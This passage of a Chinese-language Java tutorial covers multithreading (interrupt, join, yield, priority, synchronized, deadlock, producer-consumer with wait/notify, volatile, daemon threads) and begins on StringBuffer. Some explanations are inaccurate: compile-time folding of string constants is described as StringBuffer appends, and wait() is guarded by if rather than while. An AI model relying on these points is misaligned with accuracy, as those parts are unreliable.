Thread(()-&gt;&#123;            System.out.println(&quot;*******72小时没睡需要睡觉&quot;);            try &#123;                Thread.sleep(10000);//睡10s            &#125; catch (InterruptedException e) &#123;                System.out.println(&quot;敢打扰我睡觉打死你&quot;);;            &#125;            System.out.println(&quot;********已经睡好了，可以出去了&quot;);        &#125;);        thread.start(); //开始睡        Thread.sleep(1000);        if (!thread.isInterrupted())&#123;            System.out.println(&quot;我偷偷的打扰你一下&quot;);            thread.interrupt(); //中断执行        &#125;    &#125;&#125;\n\n​    所有正在执行的线程都是可以被中断的，中断线程必须进行异常的处理。\n线程强制运行​    所谓的线程的强制执行指的是当满足于某些条件之后，某一个线程对象可以一直独占资源一直到该线程的程序执行结束。\n范例：观察一个没有强制执行的程序\npackage three;//线程强制运行public class Test9 &#123;    public static void main(String[] args) throws InterruptedException &#123;        Thread thread = new Thread(() -&gt; &#123;            for (int x = 0; x &lt; 100; x++) &#123;       \t\t\t \tSystem.out.println(Thread.currentThread().getName() + &quot;执行、x = &quot; + x);            &#125;        &#125;, &quot;玩耍的线程&quot;);        thread.start();        for (int x = 0; x &lt; 100; x++) &#123;            System.out.println(&quot;【霸道的main线程】number = &quot; + x);            Thread.sleep(100);        &#125;    &#125;&#125;\n\n\n​    这个时候的主线程和子线程都在交替执行着，但是如果说现在你希望主线程独占执行。那么就可以利用Thread类中的方法。\n​    强制执行：public final void join() throws InterruptedException\npackage three;//线程强制运行public class Test9 &#123;    public static void main(String[] args) throws InterruptedException &#123;        Thread mainThread = Thread.currentThread(); //获得主线程        Thread thread = new Thread(() -&gt; &#123;            for (int x = 0; x &lt; 100; x++) &#123;                if (x == 3)&#123; //现在霸道的线程要来了                    try &#123;                        mainThread.join(); //霸道的线程先处理                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                &#125;                System.out.println(Thread.currentThread().getName() + &quot;执行、x = &quot; + x);            &#125;        &#125;, &quot;玩耍的线程&quot;);        thread.start();        for (int x = 0; x &lt; 100; x++) &#123;            Thread.sleep(100);            System.out.println(&quot;【霸道的main线程】number = &quot; + x);        &#125;    &#125;&#125;\n\n\n​    在进行线程强制执行的时候一定要获取强制执行线程对象之后才可以执行join()调用。\n线程礼让​    线程的礼让指的是将资源让出去让别的线程先执行。线程的礼让可以使用Thread中提供的方法：\n​    礼让方法：public static void yield()\n范例：使用礼让操作\npackage three;//线程礼让public class Test10 &#123;    public static void main(String[] args) throws InterruptedException &#123;        Thread mainThread = Thread.currentThread(); //获得主线程        Thread thread = new Thread(() -&gt; &#123;            for (int x = 0; x &lt; 100; x++) &#123;                if (x % 3 == 0)&#123;                    Thread.yield(); //线程礼让                    System.out.println(&quot;玩耍的线程礼让执行&quot;);                &#125;                try &#123;                    Thread.sleep(100);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                System.out.println(Thread.currentThread().getName() + &quot;执行、x = &quot; + x);            &#125;        &#125;, &quot;玩耍的线程&quot;);        thread.start();        for (int x = 0; x &lt; 100; x++) &#123;            Thread.sleep(100);            System.out.println(&quot;【霸道的main线程】number = &quot; + x);        &#125;    &#125;&#125;\n\n\n线程优先级​    从理论上来讲线程的优先级越高越有可能先执行（也越有可能先抢占到资源）。\n​    在Thread类里面针对于优先级的操作提供有如下的两个处理方法：\n​    1、设置优先级：public finial void setPriority(int newPriority);\n​    2、获取优先级：public final int getPriority（）\n​    在进行优先级定义的时候都是通过int 型的数字来完成的，而对于此数字的选择在Thread类里面就定义有三个常量：\n​    1、最高优先级：public static final int MAX PRIORITY,10;\n​    2、中等优先级：public static final int NORM PRIORITY,5;\n​    3、最低优先级：public static final int MIN PRIORITY,1;\n范例：观察优先级\npackage three;//线程优先级public class Test11 &#123;    public static void main(String[] args) &#123;        Runnable run = ()-&gt;&#123;            for (int x = 0;x&lt;10;x++)&#123;                System.out.println(Thread.currentThread().getName()+&quot;执行。&quot;);            &#125;        &#125;;        Thread threadA = new Thread(run,&quot;线程对象A&quot;);        Thread threadB = new Thread(run,&quot;线程对象B&quot;);        Thread threadC = new Thread(run,&quot;线程对象C&quot;);        threadA.setPriority(Thread.MIN_PRIORITY);        threadB.setPriority(Thread.MIN_PRIORITY);        threadC.setPriority(Thread.MAX_PRIORITY);        threadA.start();        threadB.start();        threadC.start();    &#125;&#125;\n\n​    把C的优先级提高，C先执行的概率提高了。\n​    主方法是一个主线程，那么主线程的优先级呢？\npackage three;//线程优先级public class Test11 &#123;    public static void main(String[] args) &#123;        \t\t\t\t\t\t\t\t\t\tSystem.out.println(Thread.currentThread().getPriority());//5    &#125;&#125;\n\n​    主线程是属于中等优先级，而默认创建的线程也是中等优先级。优先级高的可能先执行而不是绝对先执行。\n\n线程的同步与死锁​    在多线程的处理之中，可以利用 Runnable 描述多个线程操作的资源，而  Thread 描述每一个线程对象，于是当多个线程访问同一资源的时候如果处理不当就会产生数据的错误操作。\n同步问题引出范例：实现卖票操作\npackage three;//实现卖票操作，同步问题引出class MyThread5 implements Runnable&#123;    private int ticket = 10; //总票数10张    @Override    public void run() &#123;        while (true)&#123;            if (this.ticket &gt; 0)&#123;                System.out.println(Thread.currentThread().getName() + &quot;卖票,ticket = &quot;+this.ticket --);            &#125;else &#123;                System.out.println(&quot;********票已经卖光了*********&quot;);                break;            &#125;        &#125;    &#125;&#125;public class Test12 &#123;    public static void main(String[] args) &#123;        MyThread5 mt = new MyThread5();        new Thread(mt,&quot;票贩子A&quot;).start();        new Thread(mt,&quot;票贩子B&quot;).start();        new Thread(mt,&quot;票贩子C&quot;).start();    &#125;&#125;\n\n\n​    此时的程序将创建三个线程对象，并且这三个线程对象将进行5张票的出售。此时的程序在进行卖票处理的时候并没有任何的问题（假象），下面可以模拟一下卖票中的延迟操作。\npackage three;//实现卖票操作，同步问题引出class MyThread5 implements Runnable&#123;    private int ticket = 10; //总票数10张    @Override    public void run() &#123;        while (true)&#123;            if (this.ticket &gt; 0)&#123;                try &#123;                    Thread.sleep(100); //模拟网络延迟                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                System.out.println(Thread.currentThread().getName() + &quot;卖票,ticket = &quot;+this.ticket --);            &#125;else &#123;                System.out.println(&quot;********票已经卖光了*********&quot;);                break;            &#125;        &#125;    &#125;&#125;public class Test12 &#123;    public static void main(String[] args) &#123;        MyThread5 mt = new MyThread5();        new Thread(mt,&quot;票贩子A&quot;).start();        new Thread(mt,&quot;票贩子B&quot;).start();        new Thread(mt,&quot;票贩子C&quot;).start();    &#125;&#125;\n\n\n​    这个时候追加了延迟问题就暴露出来了，而实际上这个问题一直都在。如下图所示\n\n线程同步处理​    经过分析之后已经可以确认同步问题所产生的主要原因了，那么，下面就需要进行同步问题的解决，解决同步问题的关键是锁，指的是当某一个线程执行操作的时候，其它线程外面等待。\n​    如果想解决这样的问题，就必须使用同步，所谓的同步就是指多个操作在同一个时间段内只能有一个线程进行，其他线程要等待此线程完成之后才可以继续执行。\n\n​    如果要想在程序之中实现这把锁的功能，就可以使用synchronized关键字来实现，利用此关键字可以定义同步方法或同步代码块，在同步代码块的操作里面的代码只允许一个线程执行。\n​    1、利用同步代码块进行处理\nsynchronized(同步对象)&#123;  同步代码操作;&#125;\n\n​    一般要进行同步对象处理的时候可以采用当前对象 this 进行同步。\n范例:利用同步代码块解决数据同步访问问题\npackage three;//利用同步代码块解决数据同步访问问题class MyThread6 implements Runnable &#123;    private int ticket = 10; //总票数10张    @Override    public void run() &#123;        while (true) &#123;            synchronized (this) &#123; //每一次只允许一个线程进行访问                if (this.ticket &gt; 0) &#123;                    try &#123;                        Thread.sleep(100); //模拟网络延迟                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                    System.out.println(Thread.currentThread().getName() + &quot;卖票,ticket = &quot; + this.ticket--);                &#125; else &#123;                    System.out.println(&quot;********票已经卖光了*********&quot;);                    break;                &#125;            &#125;        &#125;    &#125;&#125;public class Test13 &#123;    public static void main(String[] args) &#123;        MyThread6 mt = new MyThread6();        new Thread(mt, &quot;票贩子A&quot;).start();        new Thread(mt, &quot;票贩子B&quot;).start();        new Thread(mt, &quot;票贩子C&quot;).start();    &#125;&#125;\n\n\n​    加入同步处理之后，程序的整体的性能下降了。同步实际上会造成性能的降低。\n​    2、利用同步方法解决：只需要在方法定义上使用 synchronized 关键字即可。\npackage three;//利用同步方法解决数据同步访问问题class MyThread6 implements Runnable &#123;    private int ticket = 10; //总票数10张    public synchronized boolean sale() &#123;        if (this.ticket &gt; 0) &#123;            try &#123;                Thread.sleep(100); //模拟网络延迟            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;            System.out.println(Thread.currentThread().getName() + &quot;卖票,ticket = &quot; + this.ticket--);            return true;        &#125; else &#123;            System.out.println(&quot;********票已经卖光了*********&quot;);            return false;        &#125;    &#125;    @Override    public void run() &#123;        while (this.sale()) &#123;            ;        &#125;    &#125;&#125;public class Test13 &#123;    public static void main(String[] args) &#123;        MyThread6 mt = new MyThread6();        new Thread(mt, &quot;票贩子A&quot;).start();        new Thread(mt, &quot;票贩子B&quot;).start();        new Thread(mt, &quot;票贩子C&quot;).start();    &#125;&#125;\n\n\n​    在日后学习 Java 类库的时候会发现，系统中许多的类上使用的同步处理采用的都是同步方法。\n线程死锁​    死锁是在进行多线程同步的处理之中有可能产生的一种问题，所谓的死锁指的是若干个线程彼此互相等待的状态。下面通过简单的代码来观察一下死锁的表现形式，但是对于此代码不作为重点。\n范例：死锁的原理展示\npackage three;//线程死锁class Jian &#123;    public synchronized void say(XiaoQiang xq) &#123;        System.out.println(&quot;此路是我开，给钱&quot;);        xq.get();    &#125;    public synchronized void get() &#123;        System.out.println(&quot;拿到钱了，让出了路&quot;);    &#125;&#125;class XiaoQiang &#123;    public synchronized void say(Jian jj) &#123;        System.out.println(&quot;让我走了给你钱&quot;);        jj.get();    &#125;    public synchronized void get() &#123;        System.out.println(&quot;跑掉了，不给钱了&quot;);    &#125;&#125;public class Test14 implements Runnable &#123;    private Jian jj = new Jian();    private XiaoQiang xq = new XiaoQiang();    public Test14() &#123;        new Thread(this).start();        xq.say(jj);    &#125;    @Override    public void run() &#123;        jj.say(xq);    &#125;    public static void main(String[] args) &#123;        new Test14();    &#125;&#125;\n\n\n​    现在死锁造成的主要原因是因为彼此都在互相等待着，等待着对方先让出资源。死锁实际上是一种开发中出现的不确定的状态，有的时候代码如果处理不当则会不定期出现死锁，这是属于正常开发中的调试问题。\n​    若干个线程访问同一资源时一定要进行同步处理，而过多的同步会造成死锁。\n\n综合实战：“生产者-消费者”模型生产者与消费者基本程序模型​    模型具体内容：在多线程的开发过程之中最为著名的案例就是生产者与消费者操作，该操作的主要流程如下：\n​    1、生产者负责信息内容的生产;\n​    2、每当生产者生产完成一项完整的信息之后消费者要从这里面取走信息;\n​    3、如果生产者没有生产则消费者要等待它生产完成，如果消费者还没有对信息进行消费，则生产者应该等待消费处理完成后再继续进行生产。\n​    程序基本实现：可以将生产者与消费者定义为两个独立的线程类对象，但是对于现在生产的数据，可以使用如下的组成：\n​    数据一: title=王建、content=宇宙大帅哥;\n​    数据二: title=小高、content=猥琐第一人;\n​    既然生产者与消费者是两个独立的线程，那么这两个独立的线程之间就需要有一个数据的保存集中点，那么可以单独定义一个 Message 类实现数据的保存。\n\n范例:程序基本结构\npackage three;//生产者-消费者模型class Producer implements Runnable &#123;    private Message msg;    public Producer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            if (x % 2 == 0) &#123;                this.msg.setTitle(&quot;王健&quot;);                try &#123;                    Thread.sleep(10);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                this.msg.setContent(&quot;宇宙大帅哥&quot;);            &#125; else &#123;                this.msg.setTitle(&quot;小高&quot;);                this.msg.setContent(&quot;猥琐第一人&quot;);            &#125;        &#125;    &#125;&#125;class Consumer implements Runnable &#123;    private Message msg;    public Consumer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            System.out.println( x+this.msg.getTitle() + &quot; - &quot; + this.msg.getContent());        &#125;    &#125;&#125;class Message &#123;    private String title;    private String content;    public String getTitle() &#123;        return title;    &#125;    public void setTitle(String title) &#123;        this.title = title;    &#125;    public String getContent() &#123;        return content;    &#125;    public void setContent(String content) &#123;        this.content = content;    &#125;&#125;public class Test15 &#123;    public static void main(String[] args) &#123;        Message msg = new Message();        new Thread(new Producer(msg)).start(); //启动生产者线程        new Thread(new Consumer(msg)).start(); //启动消费者线程    &#125;&#125;\n\n\n​    通过整个代码的执行你会发现此时有两个主要问题:\n​        问题一:数据不同步了;\n​        问题二:生产一个取走一个，但是发现有了重复生产和重复取出问题。\n解决数据同步​    如果要解决问题，首先解决的就是数据同步的处理问题，如果要想解决数据同步最简单的做法是使用 synchronized 关键字定义同步代码块或同步方法，于是这个时候对于同步的处理就可以直接在 Message 类中完成。\n范例：解决同步操作\npackage three;//生产者-消费者模型class Producer implements Runnable &#123;    private Message msg;    public Producer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            if (x % 2 == 0) &#123;                this.msg.set(&quot;王健&quot;,&quot;宇宙大帅哥&quot;);            &#125; else &#123;                this.msg.set(&quot;小高&quot;,&quot;猥琐第一人&quot;);            &#125;        &#125;    &#125;&#125;class Consumer implements Runnable &#123;    private Message msg;    public Consumer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            System.out.println(x + this.msg.get());        &#125;    &#125;&#125;class Message &#123;    private String title;    private String content;    public synchronized void set(String title, String content) &#123;        this.title = title;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        this.content = content;    &#125;    public synchronized String get() &#123;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        return this.title + &quot; - &quot; + this.content;    &#125;&#125;public class Test15 &#123;    public static void main(String[] args) &#123;        Message msg = new Message();        new Thread(new Producer(msg)).start(); //启动生产者线程        new Thread(new Consumer(msg)).start(); //启动消费者线程    &#125;&#125;\n\n\n​    在进行同步处理的时候肯定需要有一个同步的处理对象，那么此时肯定要将同步操作交由 Message 类处理是最合适的。这个时候发现数据已经可以正常的保持一致了，但是对于重复操作的问题依然存在。\n利用Object类解决重复操作​    线程等待与唤醒\n​    如果说现在要想解决生产者与消费者的问题，那么最好的解决方案就是使用等待与.唤醒机制，而对于等待与唤醒的操作机制，主要依靠的是 Object 类中提供的方法处理的:\n等待机制：\t死等: public final void wait() throws InterruptedException;\t设置等待时间: public final void wait(long timeout) throws InterruptedException;\t设置等待时间: public final void wait(long timeout, int nanos) throws InterruptedException;唤醒第一个等待线程: public final void notify();唤醒全部等待线程: public final void notifyAll();\n\n​    如果此时有若干个等待线程的话，那么 notify() 表示的是唤醒第一个等待的，而其它的线程继续等待。而 notifyAll()表示醒所有等待的线程，哪个线程的优先级高就有可能先执行。\n​    对于当前的问题主要的解决应该通过 Message 类完成处理。\n范例：修改message类\npackage three;//生产者-消费者模型class Producer implements Runnable &#123;    private Message msg;    public Producer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            if (x % 2 == 0) &#123;                this.msg.set(&quot;王健&quot;, &quot;宇宙大帅哥&quot;);            &#125; else &#123;                this.msg.set(&quot;小高&quot;, &quot;猥琐第一人&quot;);            &#125;        &#125;    &#125;&#125;class Consumer implements Runnable &#123;    private Message msg;    public Consumer(Message msg) &#123;        this.msg = msg;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 100; x++) &#123;            System.out.println(x + this.msg.get());        &#125;    &#125;&#125;class Message &#123;    private String title;    private String content;    private boolean flag = true; //表示生产或消费的形式    //flag = true:允许生产，但是不允许消费    //flag = false:允许消费,不允许生产    public synchronized void set(String title, String content) &#123;        if (!this.flag) &#123; //无法进行生产，应该等待被消费            try &#123;                super.wait();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;        this.title = title;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        this.content = content;        this.flag = false; //已经生产过了        super.notify(); //唤醒等待的线程    &#125;    public synchronized String get() &#123;        if (this.flag == true) &#123; //还未生产,需要等待            try &#123;                super.wait();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        try &#123;            return this.title + &quot; - &quot; + this.content;        &#125; finally &#123; //不管如何都要执行            this.flag = true;//继续生产            super.notify();//唤醒等待线程        &#125;    &#125;&#125;public class Test15 &#123;    public static void main(String[] args) &#123;        Message msg = new Message();        new Thread(new Producer(msg)).start(); //启动生产者线程        new Thread(new Consumer(msg)).start(); //启动消费者线程    &#125;&#125;\n\n\n​    注：这种处理形式就是在进行多线程开发过程之中最原始的处理方案，整个的等待、同步唤醒机制都有开发者自行通过原生代码实现控制。\n\n多线程深入话题优雅的停止线程​    在多线程操作之中如果要启动多线程肯定使用的是 Thread 类中的 start() 方法，而如果对于多线程需要进行停止处理，Thread 类原本提供有 stop() 方法。但是对于这些方法从 JDK1.2 版本开始就已经将其废除了，而且一直到现在也不再建议出现在你的代码中.而除了 stop() 之外还有几个方法也被禁用。\n以下方法均禁用\t\t停止多线程: public void stop()\t销毁多线程: public void destroy()\t挂起线程: public final void suspend()、暂停执行\t恢复挂起的线程执行: public final void resume()\n\n​    之所以废除掉这些方法，主要的原因是因为这些方法有可能导致线程的死锁。所以从 JDK1.2 开始就都不建议使用，如果要想实现线程的停止需要通过一种柔和的方式来进行。\n范例:实现线程柔和的停止\npackage three;//实现线程柔和的停止public class Test16 &#123;    public static boolean flag = true;    public static void main(String[] args) throws InterruptedException &#123;        new Thread(() -&gt; &#123;            long num = 0;            while (flag) &#123;                try &#123;                    Thread.sleep(40);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                System.out.println(Thread.currentThread().getName() + &quot;正在运行、&quot; + num++);            &#125;        &#125;,&quot;执行线程&quot;).start();        Thread.sleep(200); //运行200ms        flag = false; //停止线程    &#125;&#125;\n\n\n​    万一现在有其他的线程去控制这个flag的内容，那么这个时候对于线程的停止也不是说停就立刻停止的，而是会在执行中判断flag的内容来完成的。\n后台守护线程​    在多线程里面可以进行守护线程的定义，也就是说如果现在主线程的程序或者其它的线程还在执行的时候,线程将一直存在，并且运行在后台状态。\n 在 Thread 类里面提供有如下的守护线程的操作方法:\n\n设置为守护线程: public final void setDaemon(boolean on);判断是否为守护线程:public final boolean isDaemon();\n\n范例：使用守护线程\npackage three;//使用守护线程public class Test17 &#123;    public static boolean flag = true;    public static void main(String[] args) throws InterruptedException &#123;        Thread userThread = new Thread(() -&gt; &#123;            for (int x = 0; x &lt; 10; x++) &#123;                try &#123;                    Thread.sleep(100);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                System.out.println(Thread.currentThread().getName() + &quot;正在运行、x = &quot; + x);            &#125;        &#125;,&quot;用户线程&quot;); //完成核心的业务        Thread daemonThread = new Thread(() -&gt; &#123;            for (int x = 0; x &lt; Integer.MAX_VALUE; x++) &#123;                try &#123;                    Thread.sleep(100);                &#125; catch (InterruptedException e) &#123;                    throw new RuntimeException(e);                &#125;                System.out.println(Thread.currentThread().getName() + &quot;正在运行、x = &quot; + x);            &#125;        &#125;,&quot;守护线程&quot;); //完成守护的业务        daemonThread.setDaemon(true); //设置为守护线程        userThread.start();        daemonThread.start();    &#125;&#125;\n\n\n​    可以发现所有的守护线程都是围绕在用户线程的周围，如果程序执行完毕了，守护线程也就消失了在整个的 JVM 里面最大的守护线程就是 GC 线程。程序执行中 GC 线程会一直存在，如果程序执行完毕，GC 线程也将消失。\nvolatile关键字​    多线程的定义之中，volatile 关键字主要是在属性定义上使用的，表示此属性为直接数据操作，而不进行副本的拷贝处理。\n​    在正常进行变量处理的时候往往会经历如下的几个步骤：1、获取变量原有的数据内容副本；2、利用副本为变量进行数学计算；3、将计算后的变量，保存到原始空间之中；\n​    如果一个属性上追加了 volatile 关键字，表示的就是不使用副本，而是直接操作原始变量，相当于节约了拷贝副本，重新保存的步骤。\n\npackage three;class MyThread7 implements Runnable&#123;    private volatile int ticket = 5;//直接内存操作    @Override    public void run() &#123;        while (this.ticket &gt; 0)&#123;            try &#123;                Thread.sleep(100);            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;            System.out.println(Thread.currentThread().getName() + &quot;卖票处理.ticket = &quot;+this.ticket -- );        &#125;    &#125;&#125;public class Test18 &#123;    public static void main(String[] args) &#123;        MyThread7 mt = new MyThread7();        new Thread(mt,&quot;票贩子A&quot;).start();        new Thread(mt,&quot;票贩子B&quot;).start();        new Thread(mt,&quot;票贩子C&quot;).start();    &#125;&#125;\n\n\n​    解释 volatile 与 synchronized 的区别：\n​    1、volatile 无法描述同步的处理，它只是一种直接内存的处理，避免了副本的操作，而 synchronized 是实现同步的;\n​    2、volatile主要在属性上使用，而synchronized是在代码块与方法上使用的；\n\n多线程综合案例数字加减​    设计4个线程对象，两个线程执行减操作，两个线程执行加操作。\npackage three;//多线程案例一数字加减class Resource &#123; //定义一个操作的资源    private int num = 0; //这个是要进行加减操作的数据    private boolean flag = true; //加减的切换    //flag = true,表示可以进行加法操作，但是无法进行减法操作    //flag = false，表示可以进行减法操作，但是无法进行加法操作    public synchronized void add() throws InterruptedException &#123;        if (this.flag == false)&#123; //现在需要的是减法操作，加法操作要等待            super.wait();        &#125;        Thread.sleep(100);        this.num++;        System.out.println(&quot;【加法操作 - &quot; + Thread.currentThread().getName() + &quot;】num = &quot; + this.num);        this.flag = false; //加法操作执行完毕，需要执行减法        super.notifyAll(); //唤醒全部进程    &#125;    public synchronized void sub() throws InterruptedException &#123;        if (this.flag == true)&#123; //减法操作需要等待            super.wait();        &#125;        Thread.sleep(200);        this.num--;        System.out.println(&quot;【减法操作 - &quot; + Thread.currentThread().getName() + &quot;】num = &quot; + this.num);        this.flag = true;        super.notifyAll();    &#125;&#125;class AddThread implements Runnable&#123;    private Resource resource;    public AddThread(Resource resource)&#123;        this.resource = resource;    &#125;    @Override    public void run() &#123;        for (int x= 0;x &lt; 50;x++)&#123;            try &#123;                this.resource.add();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;    &#125;&#125;class SubThread implements Runnable&#123;    private Resource resource;    public SubThread(Resource resource)&#123;        this.resource = resource;    &#125;    @Override    public void run() &#123;        for (int x= 0;x &lt; 50;x++)&#123;            try &#123;                this.resource.sub();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;    &#125;&#125;public class Test19 &#123;    public static void main(String[] args) &#123;        Resource resource = new Resource();        AddThread at = new AddThread(resource);        SubThread st = new SubThread(resource);        new Thread(at,&quot;加法线程 - A&quot;).start();        new Thread(at,&quot;加法线程 - B&quot;).start();        new Thread(st,&quot;减法线程 - X&quot;).start();        new Thread(st,&quot;减法线程 - X&quot;).start();    &#125;&#125;\n\n\n​    这个程序的核心本质在于：加一个，减一个，整体的计算结果应该只在0，-1，1之间循环出现。\n生产电脑​    设计一个生产电脑和搬运电脑类，要求生产出一台电脑就搬走一台电脑，如果没有新的电脑生产出来，则搬运工要等待新电脑产出，如果生产出的电脑没有搬走，则要等待电脑搬走之后再生产，并统计出生产的电脑数量。\n​    在本程序之中实现的就是一个标准的生产者与消费者的处理模型，实现操作的代码如下：\npackage three;class Producer1 implements Runnable &#123;    private Resource1 resource1;    public Producer1(Resource1 resource1) &#123;        this.resource1 = resource1;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 50; x++) &#123;            try &#123;                this.resource1.make();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;    &#125;&#125;class Consumer1 implements Runnable &#123;    private Resource1 resource1;    public Consumer1(Resource1 resource1) &#123;        this.resource1 = resource1;    &#125;    @Override    public void run() &#123;        for (int x = 0; x &lt; 50; x++) &#123;            try &#123;                this.resource1.get();            &#125; catch (InterruptedException e) &#123;                throw new RuntimeException(e);            &#125;        &#125;    &#125;&#125;class Computer &#123;    private static int count = 0; //表示生产个数    private String name;    private double price;    public Computer(String name, double price) &#123;        this.name = name;        this.price = price;        count++;    &#125;    public String toString() &#123;        return &quot;【第&quot; + count + &quot;台电脑】&quot; + &quot;电脑名字： &quot; + this.name + &quot;、价值： &quot; + this.price;    &#125;&#125;class Resource1 &#123;    private Computer computer;    public synchronized void make() throws InterruptedException &#123;        if (this.computer != null) &#123; //已经生产过了            super.wait();        &#125;        Thread.sleep(100);        this.computer = new Computer(&quot;Mes9s0的电脑&quot;, 1.1);        System.out.println(&quot;【生产电脑】&quot; + this.computer);        super.notifyAll();    &#125;    public synchronized void get() throws InterruptedException &#123;        if (this.computer == null) &#123; //没有生产过            super.wait();        &#125;        Thread.sleep(10);        System.out.println(&quot;【取走电脑】&quot; + this.computer);        this.computer = null; //已经取走了        super.notifyAll();    &#125;&#125;public class Test20 &#123;    public static void main(String[] args) &#123;        Resource1 resource1 = new Resource1();        new Thread(new Producer1(resource1)).start();        new Thread(new Consumer1(resource1)).start();    &#125;&#125;\n\n\n竞争抢答​    实现一个竞拍抢答程序:要求设置三个抢答者美三个线程)，而后同时发出抢答指令，抢答成功者给出成功提示，抢答者未成功者给出失败提示。\n​    对于这一个多线程的操作由于里面需要牵扯到数据的返回问题，那么现在最好使用的 Callable是比较方便的处理形式，代码如下：\npackage three;//竞争抢答import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;class MyThread8 implements Callable&lt;String&gt;&#123;    private boolean flag = false; //抢答处理    @Override    public String call() throws Exception &#123;        synchronized (this)&#123;            if (this.flag == false)&#123; //抢答成功                this.flag = true;                return Thread.currentThread().getName() + &quot;抢答成功！&quot;;            &#125;else &#123;                return Thread.currentThread().getName() + &quot;抢答失败！&quot;;            &#125;        &#125;    &#125;&#125;public class Test21 &#123;    public static void main(String[] args) throws ExecutionException, InterruptedException &#123;        MyThread8 mt = new MyThread8();        FutureTask&lt;String&gt; taskA = new FutureTask&lt;&gt;(mt);        FutureTask&lt;String&gt; taskB = new FutureTask&lt;&gt;(mt);        FutureTask&lt;String&gt; taskC = new FutureTask&lt;&gt;(mt);        new Thread(taskA,&quot;竞赛者A&quot;).start();        new Thread(taskB,&quot;竞赛者B&quot;).start();        new Thread(taskC,&quot;竞赛者C&quot;).start();        System.out.println(taskA.get());        System.out.println(taskB.get());        System.out.println(taskC.get());    &#125;&#125;\n\n\n\nJava基础类库StringBuffer类​    String类 是在所有项目开发之中一定会使用到的一个功能类，并且这个类拥有如下的特点：1、每一个字符串的常量都属于一个 String 类的匿名对象，并且不可更改。2、String 有两个常量池:静态常量池、运行时常量池。3、String 类对象实例化建议使用直接赋值的形式完成，这样可以直接将对象保护在对象池中以下次重用。\n​    但是也可以发现String 类的最大弊端：内容不允许修改。虽然大部分情况都不需要修改，但是依然可能会出现这种情况。\n​    为了解决此问题，专门提供有一个 StringBuffer 类可以实现字符串的内容修改。\n​    StringBuffer 并不像 String 类那样拥有两种对象实例化方式，StringBuffer 必须像普通类对象那样，首先进行对象的实例化，而后才可以调用方法执行处理，而这个时候可以考虑使用 StringBuffer 类中的如下方法。\n构造方法: public StringBuffer(); 构造方法: public StringBuffer(String str)，接收初始化字符串内容;数据追加: public StringBuffer append(数据类型变量)，相当于字符串中的“+”操作；\n\n范例：观察String与StringBuffer对比\n1、String类对象引用传递\npackage three;//String类对象引用传递public class Test22 &#123;    public static void main(String[] args) &#123;        String str = &quot;Hello&quot;;        change(str);        System.out.println(str);    &#125;    public static void change(String temp)&#123;        temp += &quot;World !&quot;;    &#125;&#125;\n\n\n​    可以发现最后的内容并没有改变。\n2、StingBuffer类对象引用传递\npackage three;//StringBuffer类对象引用传递public class Test22 &#123;    public static void main(String[] args) &#123;        StringBuffer sb = new StringBuffer(&quot;Hello &quot;);        change(sb);        System.out.println(sb.toString());    &#125;    public static void change(StringBuffer temp)&#123;        temp.append(&quot;World!&quot;);    &#125;&#125;\n\n\n​    大部分情况下不是会出现改变字符串的内容，这种改变指的并不是针对于静态常量池的改变。\n范例：分析一下已有问题\npackage three;//String类对象引用传递public class Test22 &#123;    public static void main(String[] args) &#123;        String strA = &quot;mes9s0&quot;;        String strB = &quot;mes&quot; + &quot;9s0&quot;;        System.out.println(strB == strA);    &#125;&#125;\n\n​    注：这个时候的 strB 对象的内容并不算是改变，严格的意义上来讲，对于现在的 strB 当程序编译之后会变为如下的形式：\nStringBuffer buf = new StringBuffer();buf.append(&quot;mes&quot;).append(&quot;9&quot;).append(&quot;s0&quot;);\n\n​    所有的“+”在编译之后都变为了 StringBuffer 中的 append() 方法，并且在程序之中 StringBuffer 与 String 类对象之间可以直接相互转换：1、String 类对象变为 StringBuffer 可以依靠 StringBuffer 类的构造方法或者使用append 方法。2、所有类对象都可以通过 toString() 方法将其变为 String 类型。\n​    在 StringBuffer 类里面除了可以支持有字符串内容的修改之外，实际上也提供有了一些 String 类所不具备的方法：\n​    1、插入数据:\npublic StringBuffer insert(int offset,数据类型 b)：\n\npublic class Test22 &#123;    public static void main(String[] args) &#123;        StringBuffer buf = new StringBuffer();        buf.append(&quot;9s0&quot;).insert(0,&quot;me&quot;).insert(2,&quot;s&quot;);        System.out.println(buf);//mes9s0    